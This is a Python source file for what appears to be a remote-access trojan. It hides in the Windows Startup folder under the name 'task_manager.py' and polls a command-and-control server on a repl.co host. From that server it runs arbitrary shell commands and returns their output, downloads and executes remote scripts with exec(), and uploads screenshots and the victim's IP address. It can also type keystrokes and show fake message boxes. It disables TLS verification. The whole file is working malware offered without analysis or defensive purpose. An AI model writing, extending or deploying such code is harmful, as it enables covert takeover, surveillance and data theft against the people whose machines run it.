import requests
import tkinter.messagebox as tkm
import os
from time import sleep
import sys
import base64
import codecs
import subprocess
import urllib.request
import keyboard
from PIL import ImageGrab
import shutil
import ssl
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
#Fix in next version xcrenshots: persistency
try:
  import pyautogui
except:
  pass

#pyautogui, requests, codecs,


def return_output(command):
  #print("in return outpyut")
  returned_text = subprocess.check_output(command,
                                          shell=True,
                                          universal_newlines=True)
  #print("dir command to list file and directory")
  send(returned_text)


def return_output_cd(command):
  returned_text = subprocess.check_output(command,
                                          shell=True,
                                          universal_newlines=True)
  #print("dir command to list file and directory")
  send_cd(returned_text)


def execute_silently(command):
  #print("in return silent")
  try:
    p = subprocess.Popen(command,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
    out, err = p.communicate()
  except Exception as e:

    send(f"error with silent execution of {e}")

  #print("done executing")


def execute_normally(command):
  #os.system(f"START {command}")
  pass


def execute_file(file):
  os.system(f"START {file}")


def send(data):
  requests.post("https://c2c-server.posydon.repl.co/recieve",
                data=base64.b64encode(codecs.encode(data)))


def send_shell(data):
  requests.post("https://c2c-server.posydon.repl.co/recieve_shell",
                data=base64.b64encode(codecs.encode(data)))


def send_screen(data):
  requests.post("https://c2c-server.posydon.repl.co/recieve_screen",
                data=base64.b64encode(data))


def send_ip(data):
  requests.post("https://c2c-server.posydon.repl.co/recieve_ip",
                data=base64.b64encode(data))


def send_cd(data):
  requests.post("https://c2c-server.posydon.repl.co/recieve_cd",
                data=base64.b64encode(data))


def execute():
  send_ip(urllib.request.urlopen('https://ident.me').read())

  #determine command parameters
  instructs = sess.get("https://c2c-server.posydon.repl.co/inst",
                       verify=False).text
  #print(f"text gotten: {instructs}")
  d_instructs = base64.b64decode(instructs[1:-1])
  #print(f"decrypted (bytes): {d_instructs}")
  a_instructs = codecs.decode(d_instructs)
  #print(a_instructs)
  array_of_lines = a_instructs.splitlines()
  c_arr = a_instructs.split()
  #print(c_arr)
  repeat = int(c_arr[0])
  type = c_arr[1]
  #print(c_arr)
  command_with_ticks = c_arr[3]
  formatted_command = command_with_ticks.replace("`", " ")
  c_arr[3] = formatted_command
  try:
    formatted_msg_box_text = c_arr[4].replace("`", " ")
    c_arr[4] = formatted_msg_box_text
  except:
    pass
  #print(c_arr)
  send("got thy goods")

  #execute command x amount of times
  for i in range(repeat):

    #check if type is script or command
    if type == "script":
      #execute script
      script = sess.get("https://c2c-server.posydon.repl.co/script",
                        verify=False).text
      exec(script)
    elif type == "notscript":
      if c_arr[2] == "99o":
        try:
          #print(f"command: {c_arr[3]}")
          return_output(c_arr[3])
        except:
          send(f"command {c_arr[3]} failed unexpectedly (return output)")
      elif c_arr[2] == "99s":
        try:
          #print(f"command: {c_arr[3]}")
          execute_silently(c_arr[3])
          return_output(c_arr[3])
        except:
          send(f"command {c_arr[3]} failed unexpectedly (execute silently)")
      elif c_arr[2] == "99n":
        try:
          #print(f"command: {c_arr[3]}")
          execute_normally(c_arr[3])
        except:
          send(f"command {c_arr[3]} failed unexpectedly (execute normally)")
      elif c_arr[2] == "screenshot":
        try:
          screenshot = ImageGrab.grab()
          screenshot.save("shot.png")
          sess.post("https://c2c-server.posydon.repl.co/upload",
                    files={'image': open("shot.png", 'rb')})
          os.remove("shot.png")
        except Exception as e:
          send(f"screenshot failed, with exception as follows: \n {e}")

      elif c_arr[2] == "keyboard_w":
        try:
          #print(f"keyboard sendng: {c_arr[3]}")
          keyboard.write(c_arr[3], delay=0.1)
        except Exception as e:
          send(f"keyboard write failed, with exception as follows: \n {e}")

      elif c_arr[2] == "keyboard_message":
        try:
          #print(f"keyboard sending message")
          message = sess.get("https://c2c-server.posydon.repl.co/message",
                             verify=False).text
          keyboard.write(message, delay=0.01)
        except Exception as e:
          send(f"keyboard write failed, with exception as follows: \n {e}")

      elif c_arr[2] == "keyboard_s":
        try:
          keyboard.send(c_arr[3])
        except Exception as e:
          send(f"send_keys failed, with exception as follows: \n {e}")

      elif c_arr[2] == "msgbox":

        send("got to messagebox elif statement")
        #print("msg selectede")

        if c_arr[5] == "error":
          try:
            #print("not done")
            tkm.showerror(c_arr[3], c_arr[4])
          except:
            send("error with tkm messagebox!")

        elif c_arr[5] == "info":
          try:
            tkm.showinfo(c_arr[3], c_arr[4])
          except:
            send("error with tkm messagebox!")

        elif c_arr[5] == "warning":
          try:
            tkm.showwarning(c_arr[3], c_arr[4])
          except:
            send("error with tkm messagebox!")
        else:
          send(f"messagebox type {c_arr[5]} is not currently supported")

      elif c_arr[2] == "file_e":
        try:
          execute_file(c_arr[3])
        except Exception as e:
          send(f"execute_file failed, with exception as follows: \n {e}")
      else:
        send("no script and no command")
        #exec(c_arr[1])
    elif type == "cscript":
      try:
        #print(f"command: {c_arr[3]}")
        execute_silently(c_arr[3])
        return_output(c_arr[3])
      except:
        send(f"command {c_arr[3]} failed unexpectedly (execute silently)")

    #os.execv(sys.argv[0], sys.argv)


try:
  shutil.copy(
    __file__,
    f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/task_manager.py'
  )
except:
  pass
sess = requests.Session()
adapter = requests.adapters.HTTPAdapter(max_retries=20)
sess.mount('http://', adapter)
ssl._create_default_https_context = ssl._create_unverified_context
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
while True:
  go_bool = sess.get("https://c2c-server.posydon.repl.co/go",
                     verify=False).text
  if go_bool == "go":
    sleep(5)
    try:
      execute()
    except:
      continue
  else:
    continue
